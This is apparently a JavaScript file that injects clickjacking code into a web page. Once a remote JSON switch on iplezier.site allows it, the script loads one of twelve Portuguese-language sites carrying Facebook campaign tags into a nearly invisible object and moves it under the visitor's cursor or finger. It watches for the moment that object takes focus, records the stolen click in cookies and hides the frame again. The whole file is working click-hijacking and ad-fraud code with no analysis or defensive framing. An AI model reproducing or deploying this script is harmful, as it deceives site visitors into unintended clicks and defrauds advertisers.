let sitesRand = [
    {link: 'https://rotadoturismo.info/?utm=facebook&campanha=6a4ad781fcc18d94eff1700b65bce780', cookie: '_gcli_10'},
    {link: 'https://comofazerweb.com/?utm=facebook&campanha=6596db5c5d0bd243c69ae18497cdd2bc', cookie: '_gcli_9'},
    {link: 'https://omundoevangelico.com.br/?utm=facebook&campanha=2bcbc908c3f933d2e524525g10039322', cookie: '_gcli_8'},
    {link: 'https://1horanews.com.br/?utm=facebook&campanha=5eb9ee46f816c98f00e1d9175b1e3fe7', cookie: '_gcli_7'},
    {link: 'https://www.noticiasdefutebol.life/?utm=facebook&campanha=05ab094fe8d8777ce13741a2ed4fc66b', cookie: '_gcli_6'},
    {link: 'https://www.micelax.com/?utm=facebook&campanha=c49d45ff6590a0bbf4f6157d87516c3c', cookie: '_gcli_5'},
    {link: 'https://animaisdanatureza.com/?utm=facebook&campanha=b3ce9b9bfa3eb6cbcbb7aaa3e6efd5d5', cookie: '_gcli_4'},
    {link: 'https://fallgames.xyz/?utm=facebook&campanha=98808ac2a0c57df5ba69cb8d786d6545', cookie: '_gcli_3'},
    {link: 'https://www.mantendoasaude.com/?utm=facebook&campanha=28d645a624b3f09820e4938912a1ed3c', cookie: '_gcli_2'},
    {link: 'https://www.guiadepescaesportivaemsantos.com/?utm=facebook&campanha=a4114a43bea2ffd5c3f836b819a45c92', cookie: '_gcli_1'},
    {link: 'https://www.micelax.com/?utmx=facebook&campanha=c49d45ff6590a0bbf4f6157d87516c3c52b', cookie: '_gcli_x1'},
    {link: 'https://www.micelax.com/?utmy=facebook&campanha=be1f642244753ecef4842549c3d5b928', cookie: '_gcli_x2'},
];
let siteSelected = [{link: null, cookie: null}];
let monitorTracker = null;
let canTrack = 0;
let htmlCode = '<div id="_gcli_div"><object id="_gcli_obj" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
let cssCode = '<style>#_gcli_div{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
let pointerTracker = function(e){
    let out = {x:0, y:0};
    if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
        let touch = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0];
        out.x = touch.pageX;
        out.y = touch.pageY;
    } else if (e.type == 'mousedown' || e.type == 'mouseup' || e.type == 'mousemove' || e.type == 'mouseover'|| e.type=='mouseout' || e.type=='mouseenter' || e.type=='mouseleave') {
        out.x = e.pageX;
        out.y = e.pageY;
    }
    return out;
};

function randomizeArray(a) {
    let j, x, i;
    for (i = a.length - 1; i > 0; i--) {
        j = Math.floor(Math.random() * (i + 1));
        x = a[i];
        a[i] = a[j];
        a[j] = x;
    }
    return a;
}
function setCookie(strCookie, strValor, lngHoras) {
    let dtmData = new Date();
    let strExpires = null;
    if (lngHoras) {
        dtmData.setTime(dtmData.getTime() + (lngHoras * 60 * 1000 * 60));
        strExpires = "; expires=" + dtmData.toGMTString();
    } else {
        strExpires = "";
    }
    document.cookie = strCookie + "=" + strValor + strExpires + "; path=/";
}
function getCookie(strCookie) {
    let strNomeIgual = strCookie + "=";
    let arrCookies = document.cookie.split(';');
    for (let i = 0; i < arrCookies.length; i++) {
        let strValorCookie = arrCookies[i];
        while (strValorCookie.charAt(0) == ' ') {
            strValorCookie = strValorCookie.substring(1, strValorCookie.length);
        }
        if (strValorCookie.indexOf(strNomeIgual) == 0) {
            return strValorCookie.substring(strNomeIgual.length, strValorCookie.length);
        }
    }
    return null;
}
function minimizeDiv() {
    canTrack = 0;
    $("#_gcli_div").css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-999999").css("position", "fixed");
    $("#_gcli_obj").css("top", "").css("left", "").css("pointer-events", "none");
}
function insertCode(){
    $("body").append(cssCode + htmlCode).css("overflow-x", "hidden").css("width", "100%");
    $(document).on('mousemove touchstart', function(e){
        let tracker = pointerTracker(e);
        if (canTrack == 1) {
            $('#_gcli_div').css({
                left:  tracker.x - Math.floor(Math.random()*(324-284+1)+284),
                top:   tracker.y - Math.floor(Math.random()*(40-20+1)+20)
            });
        }
    });

    minimizeDiv();
    setUrlObj();
}
function setUrlObj() {
    document.getElementById('_gcli_obj').data = siteSelected.link;
    showOrMinimize();
}
function showDiv() {
    canTrack = 1;
    startTracker();

    $("#_gcli_obj").css("top", "-110px").css("left", "-70px").css("pointer-events", "");
    $("#_gcli_div").css("width", "780px").css("height", "200px").css("z-index", "999999").css("position", "absolute");
}
function showOrMinimize() {
    document.getElementById('_gcli_obj').onload=function(){
        if(getCookie(siteSelected.cookie) || getCookie("_gcli_delay_time")){
            setTimeout(minimizeDiv,1000);
        } else {
            setTimeout(showDiv,5000);
        }
    }
}
function setClick(){
    setCookie(siteSelected.cookie, '1', 24 * 10);
    setCookie("_gcli_delay_time", '1', 1);
    document.activeElement.blur();
}
function startTracker() {
    monitorTracker = setInterval(function(){
        let elem = document.activeElement;
        if(elem && elem.tagName == 'OBJECT'){
            setTimeout(setClick,200);
            setTimeout(minimizeDiv,1000);
            clearInterval(monitorTracker);
        }
    }, 500);
}
$(document).ready(function () {
    $.getJSON( "https://www.iplezier.site/iplezier.json", function( data ) {
        if(data.redecanais === true){
            let i = 0;
            let alreadyClicked = true;
            randomizeArray(sitesRand);

            while (i < sitesRand.length) {
                if(getCookie(sitesRand[i].cookie) == null){
                    siteSelected = sitesRand[i];
                    alreadyClicked = false;
                    break;
                }
                siteSelected = sitesRand[i];
                i++;
            }
            insertCode();
        }
    });
});
